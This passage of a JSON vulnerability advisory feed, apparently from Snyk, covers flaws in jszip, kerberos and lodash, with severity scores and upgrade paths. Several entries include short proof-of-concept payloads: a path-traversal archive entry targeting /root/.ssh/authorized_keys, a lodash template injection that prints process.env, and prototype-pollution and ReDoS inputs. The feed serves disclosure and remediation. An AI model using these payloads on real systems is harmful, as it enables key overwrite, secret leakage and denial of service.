        "description": "## Overview\n[jszip](https://www.npmjs.org/package/jszip) is a Create, read and edit .zip files with JavaScript http://stuartk.com/jszip\n\nAffected versions of this package are vulnerable to Arbitrary File Write via Archive Extraction (Zip Slip) due to improper sanitization of filenames when files are loaded with the `loadAsync` method.\n\n## Details\n\nIt is exploited using a specially crafted zip archive, that holds path traversal filenames. When exploited, a filename in a malicious archive is concatenated to the target extraction directory, which results in the final path ending up outside of the target folder. For instance, a zip may hold a file with a \"../../file.exe\" location and thus break out of the target folder. If an executable or a configuration file is overwritten with a file containing malicious code, the problem can turn into an arbitrary code execution issue quite easily.\n\nThe following is an example of a zip archive with one benign file and one malicious file. Extracting the malicous file will result in traversing out of the target folder, ending up in `/root/.ssh/` overwriting the `authorized_keys` file:\n\n```\n\n+2018-04-15 22:04:29 ..... 19 19 good.txt\n\n+2018-04-15 22:04:42 ..... 20 20 ../../../../../../root/.ssh/authorized_keys\n\n```\n\n## Remediation\nUpgrade `jszip` to version 2.7.0, 3.8.0 or higher.\n## References\n- [Changelog](https://stuk.github.io/jszip/CHANGES.html)\n- [GitHub Commit](https://github.com/Stuk/jszip/commit/2edab366119c9ee948357c02f1206c28566cdf15)\n",
        "created_at": "2023-01-04T12:22:20Z",
        "updated_at": "2024-03-11T09:53:53Z",
        "problems": [
          {
            "id": "CVE-2022-48285",
            "source": "CVE"
          },
          {
            "id": "CWE-29",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 2.7.0 to fix this vulnerability",
                "details": {
                  "upgrade_package": "2.7.0"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<2.7.0,>=3.0.0 <3.8.0"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "medium",
            "score": 6.3,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:L"
          }
        ],
        "effective_severity_level": "medium",
        "slots": [
          {
            "disclosure_time": "2023-01-04T12:08:19Z",
            "exploit": "Not Defined",
            "publication_time": "2023-01-04T13:41:05Z",
            "references": [
              {
                "url": "https://stuk.github.io/jszip/CHANGES.html",
                "title": "Changelog"
              },
              {
                "url": "https://github.com/Stuk/jszip/commit/2edab366119c9ee948357c02f1206c28566cdf15",
                "title": "GitHub Commit"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-KERBEROS-568900",
      "type": "vulnerabilities",
      "attributes": {
        "title": "DLL Injection",
        "description": "## Overview\n\nAffected versions of this package are vulnerable to DLL Injection. An attacker can execute arbitrary code by creating a file with the same name in a folder that precedes the intended file in the DLL path search.\n## Remediation\nUpgrade `kerberos` to version 1.0.0 or higher.\n## References\n- [NPM Security Advisory](https://www.npmjs.com/advisories/1514)\n- [PoC](https://medium.com/@kiddo_Ha3ker/dll-injection-attack-in-kerberos-npm-package-cb4b32031cd)\n",
        "created_at": "2020-05-12T07:43:39Z",
        "updated_at": "2024-03-11T09:50:21Z",
        "problems": [
          {
            "id": "CVE-2020-13110",
            "source": "CVE"
          },
          {
            "id": "CWE-114",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 1.0.0 to fix this vulnerability",
                "details": {
                  "upgrade_package": "1.0.0"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<1.0.0"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "high",
            "score": 8.4,
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P/RL:O/RC:C"
          }
        ],
        "effective_severity_level": "high",
        "slots": [
          {
            "disclosure_time": "2020-05-11T21:44:49Z",
            "exploit": "Proof of Concept",
            "publication_time": "2020-05-12T21:52:20Z",
            "references": [
              {
                "url": "https://www.npmjs.com/advisories/1514",
                "title": "NPM Security Advisory"
              },
              {
                "url": "https://medium.com/@kiddo_Ha3ker/dll-injection-attack-in-kerberos-npm-package-cb4b32031cd",
                "title": "PoC"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-LODASH-1018905",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Regular Expression Denial of Service (ReDoS)",
        "description": "## Overview\n[lodash](https://www.npmjs.com/package/lodash) is a modern JavaScript utility library delivering modularity, performance, & extras.\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `toNumber`, `trim` and `trimEnd` functions.\r\n\r\n### POC\r\n```\r\nvar lo = require('lodash');\r\n\r\nfunction build_blank (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\n\r\nvar s = build_blank(50000)\r\nvar time0 = Date.now();\r\nlo.trim(s)\r\nvar time_cost0 = Date.now() - time0;\r\nconsole.log(\"time_cost0: \" + time_cost0)\r\n\r\nvar time1 = Date.now();\r\nlo.toNumber(s)\r\nvar time_cost1 = Date.now() - time1;\r\nconsole.log(\"time_cost1: \" + time_cost1)\r\n\r\nvar time2 = Date.now();\r\nlo.trimEnd(s)\r\nvar time_cost2 = Date.now() - time2;\r\nconsole.log(\"time_cost2: \" + time_cost2)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `lodash` to version 4.17.21 or higher.\n## References\n- [GitHub Commit](https://github.com/lodash/lodash/commit/c4847ebe7d14540bb28a8b932a9ce1b9ecbfee1a)\n- [GitHub Fix PR](https://github.com/lodash/lodash/pull/5065)\n",
        "created_at": "2020-10-16T16:48:40Z",
        "updated_at": "2024-06-13T13:26:35Z",
        "problems": [
          {
            "id": "CVE-2020-28500",
            "source": "CVE"
          },
          {
            "id": "CWE-400",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 4.17.21 to fix this vulnerability",
                "details": {
                  "upgrade_package": "4.17.21"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<4.17.21"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "medium",
            "score": 5.3,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P"
          }
        ],
        "effective_severity_level": "medium",
        "slots": [
          {
            "disclosure_time": "2020-10-16T16:47:34Z",
            "exploit": "Proof of Concept",
            "publication_time": "2021-02-15T11:50:49Z",
            "references": [
              {
                "url": "https://github.com/lodash/lodash/commit/c4847ebe7d14540bb28a8b932a9ce1b9ecbfee1a",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/lodash/lodash/pull/5065",
                "title": "GitHub Fix PR"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-LODASH-1040724",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Code Injection",
        "description": "## Overview\n[lodash](https://www.npmjs.com/package/lodash) is a modern JavaScript utility library delivering modularity, performance, & extras.\n\nAffected versions of this package are vulnerable to Code Injection via `template`.\r\n\r\n### PoC\r\n```js\r\nvar _ = require('lodash');\r\n\r\n_.template('', { variable: '){console.log(process.env)}; with(obj' })()\r\n```\n## Remediation\nUpgrade `lodash` to version 4.17.21 or higher.\n## References\n- [GitHub Commit](https://github.com/lodash/lodash/commit/3469357cff396a26c363f8c1b5a91dde28ba4b1c)\n- [Vulnerable Code](https://github.com/lodash/lodash/blob/ddfd9b11a0126db2302cb70ec9973b66baec0975/lodash.js#L14851)\n",
        "created_at": "2020-11-17T14:07:17Z",
        "updated_at": "2024-05-30T09:23:01Z",
        "problems": [
          {
            "id": "CVE-2021-23337",
            "source": "CVE"
          },
          {
            "id": "CWE-94",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 4.17.21 to fix this vulnerability",
                "details": {
                  "upgrade_package": "4.17.21"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<4.17.21"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "high",
            "score": 7.2,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H/E:P/RL:U/RC:C"
          }
        ],
        "effective_severity_level": "high",
        "slots": [
          {
            "disclosure_time": "2020-11-17T13:02:10Z",
            "exploit": "Proof of Concept",
            "publication_time": "2021-02-15T11:50:50Z",
            "references": [
              {
                "url": "https://github.com/lodash/lodash/commit/3469357cff396a26c363f8c1b5a91dde28ba4b1c",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/lodash/lodash/blob/ddfd9b11a0126db2302cb70ec9973b66baec0975/lodash.js%23L14851",
                "title": "Vulnerable Code"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-LODASH-450202",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Prototype Pollution",
        "description": "## Overview\n[lodash](https://www.npmjs.com/package/lodash) is a modern JavaScript utility library delivering modularity, performance, & extras.\n\nAffected versions of this package are vulnerable to Prototype Pollution. The function `defaultsDeep` could be tricked into adding or modifying properties of `Object.prototype` using a `constructor` payload.\r\n\r\n## PoC by Snyk\r\n```\r\nconst mergeFn = require('lodash').defaultsDeep;\r\nconst payload = '{\"constructor\": {\"prototype\": {\"a0\": true}}}'\r\n\r\nfunction check() {\r\n    mergeFn({}, JSON.parse(payload));\r\n    if (({})[`a0`] === true) {\r\n        console.log(`Vulnerable to Prototype Pollution via ${payload}`);\r\n    }\r\n  }\r\n\r\ncheck();\r\n```\r\n\r\nFor more information, check out our [blog post](https://snyk.io/blog/snyk-research-team-discovers-severe-prototype-pollution-security-vulnerabilities-affecting-all-versions-of-lodash/)\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `__proto__`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `__proto__` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `__proto__.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n\n-   Web browser\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `lodash` to version 4.17.12 or higher.\n## References\n- [GitHub Issue](https://github.com/lodash/lodash/issues/4348)\n- [GitHub PR](https://github.com/lodash/lodash/pull/4336)\n- [GitHub PR](https://github.com/lodash/lodash/pull/4355)\n- [GitHub PR](https://github.com/sailshq/lodash/pull/1)\n- [Node Security Advisory](https://www.npmjs.com/advisories/1065)\n- [Snyk Blog](https://snyk.io/blog/snyk-research-team-discovers-severe-prototype-pollution-security-vulnerabilities-affecting-all-versions-of-lodash/)\n",
        "created_at": "2019-06-19T12:04:21Z",
        "updated_at": "2024-07-09T12:47:50Z",
        "problems": [
          {
            "id": "CVE-2019-10744",
            "source": "CVE"
          },
          {
            "id": "CWE-1321",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 4.17.12 to fix this vulnerability",
                "details": {
                  "upgrade_package": "4.17.12"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<4.17.12"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "high",
            "score": 7.3,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L/E:P/RL:O/RC:C"
          }
        ],
        "effective_severity_level": "high",
        "slots": [
          {
            "disclosure_time": "2019-06-19T11:45:02Z",
            "exploit": "Proof of Concept",
            "publication_time": "2019-07-02T11:45:01Z",
            "references": [
              {
                "url": "https://github.com/lodash/lodash/issues/4348",
                "title": "GitHub Issue"
              },
              {
                "url": "https://github.com/lodash/lodash/pull/4336",
                "title": "GitHub PR"
              },
              {
                "url": "https://github.com/lodash/lodash/pull/4355",
                "title": "GitHub PR"
              },
              {
                "url": "https://github.com/sailshq/lodash/pull/1",
                "title": "GitHub PR"
              },
              {
                "url": "https://www.npmjs.com/advisories/1065",
                "title": "Node Security Advisory"
              },
              {
                "url": "https://snyk.io/blog/snyk-research-team-discovers-severe-prototype-pollution-security-vulnerabilities-affecting-all-versions-of-lodash/",
                "title": "Snyk Blog"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-LODASH-567746",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Prototype Pollution",
        "description": "## Overview\n[lodash](https://www.npmjs.com/package/lodash) is a modern JavaScript utility library delivering modularity, performance, & extras.\n\nAffected versions of this package are vulnerable to Prototype Pollution. The function `zipObjectDeep` can be tricked into adding or modifying properties of the Object prototype. These properties will be present on all objects.\n## PoC\n```js\r\nconst _ = require('lodash');\r\n\r\n_.zipObjectDeep(['__proto__.z'],[123]);\r\n\r\nconsole.log(z); // 123\r\n```\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `__proto__`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `__proto__` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `__proto__.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n\n-   Web browser\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `lodash` to version 4.17.20 or higher.\n## References\n- [GitHub Commit](https://github.com/lodash/lodash/commit/c84fe82760fb2d3e03a63379b297a1cc1a2fce12)\n- [GitHub PR](https://github.com/lodash/lodash/pull/4759)\n",
        "created_at": "2020-04-28T14:32:13Z",
        "updated_at": "2024-07-09T12:50:38Z",
        "problems": [
          {
            "id": "CVE-2020-8203",
            "source": "CVE"
          },
          {
            "id": "CWE-1321",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 4.17.20 to fix this vulnerability",
                "details": {
                  "upgrade_package": "4.17.20"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": ">=4.1.0 <4.17.20"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "high",
            "score": 8.2,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H/E:P/RL:U/RC:C"
          }
        ],
        "effective_severity_level": "high",
        "slots": [
          {
            "disclosure_time": "2020-04-27T22:14:18Z",
            "exploit": "Proof of Concept",
            "publication_time": "2020-04-28T14:59:14Z",
            "references": [
              {
                "url": "https://github.com/lodash/lodash/commit/c84fe82760fb2d3e03a63379b297a1cc1a2fce12",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/lodash/lodash/pull/4759",
                "title": "GitHub PR"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-LODASH-608086",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Prototype Pollution",
        "description": "## Overview\n[lodash](https://www.npmjs.com/package/lodash) is a modern JavaScript utility library delivering modularity, performance, & extras.\n\nAffected versions of this package are vulnerable to Prototype Pollution via the `set` and `setwith` functions due to improper user input sanitization.\n## PoC\n```js\r\nlod = require('lodash')\r\nlod.set({}, \"__proto__[test2]\", \"456\")\r\nconsole.log(Object.prototype)\r\n```\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `__proto__`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `__proto__` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `__proto__.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n\n-   Web browser\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `lodash` to version 4.17.17 or higher.\n## References\n- [HackerOne Report](https://hackerone.com/reports/864701)\n",
        "created_at": "2020-08-21T12:52:58Z",
        "updated_at": "2024-04-15T16:31:58Z",
        "problems": [
          {
            "id": "CWE-1321",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 4.17.17 to fix this vulnerability",
                "details": {
                  "upgrade_package": "4.17.17"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<4.17.17"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "high",
            "score": 7.3,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L/E:P/RL:O/RC:C"
          }
        ],
        "effective_severity_level": "high",
        "slots": [
          {
            "disclosure_time": "2020-08-21T10:34:29Z",
            "exploit": "Proof of Concept",
            "publication_time": "2020-08-21T12:53:03Z",
            "references": [
              {
                "url": "https://hackerone.com/reports/864701",
                "title": "HackerOne Report"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-LODASH-6139239",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Prototype Pollution",
        "description": "## Overview\n[lodash](https://www.npmjs.com/package/lodash) is a modern JavaScript utility library delivering modularity, performance, & extras.\n\nAffected versions of this package are vulnerable to Prototype Pollution through the `zipObjectDeep` function due to improper user input sanitization in the `baseZipObject` function.\n## PoC\n**lodash.zipobjectdeep:**\r\n\r\n```js\r\nconst zipObjectDeep = require(\"lodash.zipobjectdeep\");\r\n\r\nlet emptyObject = {};\r\n\r\n\r\nconsole.log(`[+] Before prototype pollution : ${emptyObject.polluted}`);\r\n//[+] Before prototype pollution : undefined\r\n\r\nzipObjectDeep([\"constructor.prototype.polluted\"], [true]);\r\n//we inject our malicious attributes in the vulnerable function\r\n\r\nconsole.log(`[+] After prototype pollution : ${emptyObject.polluted}`);\r\n//[+] After prototype pollution : true\r\n```\r\n\r\n**lodash:**\r\n\r\n```js\r\nconst test = require(\"lodash\");\r\n\r\nlet emptyObject = {};\r\n\r\n\r\nconsole.log(`[+] Before prototype pollution : ${emptyObject.polluted}`);\r\n//[+] Before prototype pollution : undefined\r\n\r\ntest.zipObjectDeep([\"constructor.prototype.polluted\"], [true]);\r\n//we inject our malicious attributes in the vulnerable function\r\n\r\nconsole.log(`[+] After prototype pollution : ${emptyObject.polluted}`);\r\n//[+] After prototype pollution : true\r\n```\n\n## Details\n\nPrototype 